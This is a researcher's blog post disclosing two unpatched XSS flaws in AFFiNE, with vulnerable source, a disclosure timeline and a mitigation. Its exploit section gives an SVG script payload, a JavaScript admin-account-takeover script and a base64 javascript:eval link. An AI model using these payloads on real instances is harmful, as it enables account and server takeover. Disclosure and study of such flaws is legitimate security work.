---
title: Multiple XSS Vulnerabilities in AFFiNE (Unpatched)
author: gabdevele
pubDatetime: 2026-03-15T17:44:57.411Z
slug: multiple-critical-xss-affine
featured: true
draft: false
tags:
  - cybersecurity
  - bug-bounty
description: Multiple critical XSS vulnerabilities I discovered in AFFiNE. Completely ignored by the AFFiNE team and still unpatched.
---

Continuing the list of vulnerabilities I've found in AFFiNE, after the open redirect ([CVE-2026-25477](https://gabdevele.dev/posts/2026/cve-2026-25477/)), me and [Salvatore Abello](https://x.com/salvatoreabello) discovered **2 critical Cross-Site Scripting (XSS) vulnerabilities** that, unlike the open redirect, were **completely ignored** by the AFFiNE team and are **still unpatched**.

## Discovery

After finding the open redirect completely by accident, I started going through AFFiNE's entire codebase looking for more critical vulnerabilities.
Playing around with the editor, I tried inserting a link inside a document and setting the URL to `javascript:alert(1)`.
Clicking the link did nothing, so I looked for other ways to insert a link, and surprisingly there was a second way: typing `/link` inside the document, which opened a popup to enter the URL. That one worked, **sink found**.

This vulnerability requires user interaction though, so I kept digging. Surely there had to be something worse somewhere in this codebase.

After a bit more digging, I found what looked like a SSRF but couldn't really exploit it, so I called Salvatore on Discord to help me investigate. I sent him the file I was looking at and **within 15 minutes he found a 0-click XSS** right where I had found the potential SSRF.

## Analysis

Let's start with the more interesting one: the **0-click XSS**.
In short, when you insert a link in AFFiNE and switch to "Card View", the following endpoint gets called:
`/api/worker/image-proxy/image-proxy?url=`
where the URL is whatever link you inserted.
This is done to show a link preview. Here's the source code:
```tsx
// [packages/backend/server/src/plugins/worker/controller.ts]
//...
const response = await fetch(
  new Request(targetURL.toString(), { // <-- attacker can arbitrarily set 'targetURL'
    method: 'GET',
    headers: cloneHeader(req.headers),
  })
);
if (response.ok) {
  const contentType = response.headers.get('Content-Type');
  if (contentType?.startsWith('image/')) { // <-- vulnerable check
    //...
    const contentDisposition = response.headers.get('Content-Disposition');
    return resp
      .status(200)
      .header({
        //...
        'Content-Type': contentType, // <-- reflected content-type
        'Content-Disposition': contentDisposition, // <-- reflected content-disposition
      })
      .send(buffer);
  } else {
    throw new BadRequest('Invalid content type');
  }
} 
//...
```

While this endpoint isn't really exploitable for SSRF (except for internal services exposing images), it does **leak the server's IP** even if it's behind something like a Cloudflare tunnel, and on top of that it can be accessed **without authentication**, meaning anyone who finds your self-hosted AFFiNE instance can leak your server IP.

But here's the interesting part: the sink lets an attacker set an arbitrary URL and, if the response is an image, reflects the `Content-Type` and `Content-Disposition` headers back **with no sanitization whatsoever**.
This can be exploited by pointing the URL to a controlled webhook (like requestrepo) and returning `Content-Type: image/svg+xml` with `Content-Disposition: inline`. This causes a malicious SVG like this to get executed:
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
<rect width="124" height="124" rx="24" fill="#000000"/>
   <script type="text/javascript"> 
        alert(1);
    </script>
</svg>
```

Which gives us a proper **0-Click Reflected XSS**.

---

As for the **XSS inside the document**, the root cause is the component that handles links via Bookmark:
```tsx
// [blocksuite/affine/blocks/bookmark/src/components/bookmark-card.ts]
export class BookmarkCard extends SignalWatcher {
  //...
  override render() {
    const { url, style } = this.bookmark.model.props;
  //...
    return html`
          //...
            <div
              class="affine-bookmark-content-url"
              @click=${this.bookmark.open} // <-- here
            >
              <span>${getHostName(url)}</span>
            </div>
          //...
    `;
  }
}

// [blocksuite/affine/blocks/bookmark/src/bookmark-block.ts]
export class BookmarkBlockComponent {
  //...
  open = () => {
    window.open(this.link, '_blank'); // <-- vulnerable, no sanitization
  };
  //...
}
```

If a user inserts a link with a `javascript:` scheme, clicking it will execute the malicious code, resulting in a **Stored 1-Click XSS**.

## Exploit

Since cookies are **HttpOnly**, stealing them directly isn't an option, but we can do something even more interesting, which is what made exploiting these XSSes actually fun. After spending some time reversing AFFiNE's internals, I wrote this script:
```js
(async () => {
  const url = "https://{{AFFINE_URL}}/graphql";
  async function sendRequest(payload, operationName) {
      try {
          const response = await fetch(url, {
              method: "POST",
              headers: {
                  "Content-Type": "application/json",
                  "X-Operation-Name": operationName,
              },
              body: JSON.stringify(payload)
          });
          return await response.json();
      } catch (error) {
          console.error('Error:', error);
      }
  }
  const createUserPayload = {
      "query":"mutation createUser($input: CreateUserInput!) {\n  createUser(input: $input) {\n    id\n  }\n}",
      "variables":{"input":{"name":"xss","email":"xss@xss.xss","password":"12345678"}},
      "operationName":"createUser"
  };
  
  const createUserResponse = await sendRequest(createUserPayload, "createUser");
  const updateAccountPayload = {
      "query":"mutation updateAccountFeatures($userId: String!, $features: [FeatureType!]!) {\n  updateUserFeatures(id: $userId, features: $features)\n}",
      "variables":{"userId":createUserResponse.data.createUser.id,"features":["Admin","EarlyAccess","UnlimitedCopilot","AIEarlyAccess"]},
      "operationName":"updateAccountFeatures"
  };
  
  await sendRequest(updateAccountPayload, "updateAccountFeatures");
  })();
```

This script **creates a new user, promotes them to admin and enables all features**, giving full control over the instance.

For the **0-Click Reflected XSS**, you can embed this script inside the SVG, serve it from your webhook and send it to the victim.
<video controls src="/assets/videos/reflected-xss-affine.webm" title="Exploit PoC"></video>

For the **Stored XSS**, you need an account on the AFFiNE instance and share a document containing the malicious link with the victim. When they click it, the code runs, which is basically the same exploit but base64 encoded for convenience:
```js
javascript:eval(atob("KGFzeW5jICgpID0+IHsKY29uc3QgdXJsID0gImh0dHBzOi8ve3tBRkZJTkVfVVJMfX0vZ3JhcGhxbCIKYXN5bmMgZnVuY3Rpb24gc2VuZFJlcXVlc3QocGF5bG9hZCwgb3BlcmF0aW9uTmFtZSkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKHVybCwgewogICAgICAgICAgICBtZXRob2Q6ICJQT1NUIiwKICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgICAgICJYLU9wZXJhdGlvbi1OYW1lIjogb3BlcmF0aW9uTmFtZSwKICAgICAgICAgICAgfSwKICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkocGF5bG9hZCkKICAgICAgICB9KTsKICAgICAgICByZXR1cm4gYXdhaXQgcmVzcG9uc2UuanNvbigpOwogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCdFcnJvcjonLCBlcnJvcik7CiAgICB9Cn0KCmNvbnN0IGNyZWF0ZVVzZXJQYXlsb2FkID0gewogICAgInF1ZXJ5IjoibXV0YXRpb24gY3JlYXRlVXNlcigkaW5wdXQ6IENyZWF0ZVVzZXJJbnB1dCEpIHtcbiAgY3JlYXRlVXNlcihpbnB1dDogJGlucHV0KSB7XG4gICAgaWRcbiAgfVxufSIsCiAgICAidmFyaWFibGVzIjp7ImlucHV0Ijp7Im5hbWUiOiJ4c3MiLCJlbWFpbCI6Inhzc0B4c3MueHNzIiwicGFzc3dvcmQiOiIxMjM0NTY3OCJ9fSwKICAgICJvcGVyYXRpb25OYW1lIjoiY3JlYXRlVXNlciIKfTsKCmNvbnN0IGNyZWF0ZVVzZXJSZXNwb25zZSA9IGF3YWl0IHNlbmRSZXF1ZXN0KGNyZWF0ZVVzZXJQYXlsb2FkLCAiY3JlYXRlVXNlciIpOwpjb25zdCB1cGRhdGVBY2NvdW50UGF5bG9hZCA9IHsKICAgICJxdWVyeSI6Im11dGF0aW9uIHVwZGF0ZUFjY291bnRGZWF0dXJlcygkdXNlcklkOiBTdHJpbmchLCAkZmVhdHVyZXM6IFtGZWF0dXJlVHlwZSFdISkge1xuICB1cGRhdGVVc2VyRmVhdHVyZXMoaWQ6ICR1c2VySWQsIGZlYXR1cmVzOiAkZmVhdHVyZXMpXG59IiwKICAgICJ2YXJpYWJsZXMiOnsidXNlcklkIjpjcmVhdGVVc2VyUmVzcG9uc2UuZGF0YS5jcmVhdGVVc2VyLmlkLCJmZWF0dXJlcyI6WyJBZG1pbiIsIkVhcmx5QWNjZXNzIiwiVW5saW1pdGVkQ29waWxvdCIsIkFJRWFybHlBY2Nlc3MiXX0sCiAgICAib3BlcmF0aW9uTmFtZSI6InVwZGF0ZUFjY291bnRGZWF0dXJlcyIKfTsKCmF3YWl0IHNlbmRSZXF1ZXN0KHVwZGF0ZUFjY291bnRQYXlsb2FkLCAidXBkYXRlQWNjb3VudEZlYXR1cmVzIik7Cn0pKCk7"))
```

<video controls src="/assets/videos/stored-xss-affine.webm" title="Exploit PoC"></video>

## Reporting

This is the frustrating part of this post. I was **completely ignored** by the AFFiNE team. They push commits every day, so I'm pretty sure they saw my report, they just **ghosted me** without even acknowledging the issue, showing zero interest in their users' security. These vulnerabilities could easily be **exploited in the wild**, especially on **affine.pro**, their cloud version.
I warned them that if I didn't get a response by **March 15th** I would go public, hoping this pressure would make them fix it and still nothing.

I'll be filing the vulnerability through **MITRE** since getting a CVE assigned on GitHub requires the repo maintainers to confirm it.

#### Timeline
```timeline
2026-01-26 | Vulnerability discovered and reported to AFFiNE team.
2026-03-15 | Vulnerability disclosed to the public, no response from AFFiNE team.
```

## Conclusion
Thanks to everyone who read this post, and a big thank you again to [Salvatore](https://x.com/salvatoreabello) for his contribution.
If you are hosting an AFFiNE istance, use a proxy to block access to the vulnerable endpoint (`/api/worker/image-proxy/image-proxy?url=`) until this gets patched, and be careful with any links you click inside the editor if you work it with untrusted users.
I hope this reaches as many people as possible so we can put some pressure on the AFFiNE team to actually patch these vulnerabilities.
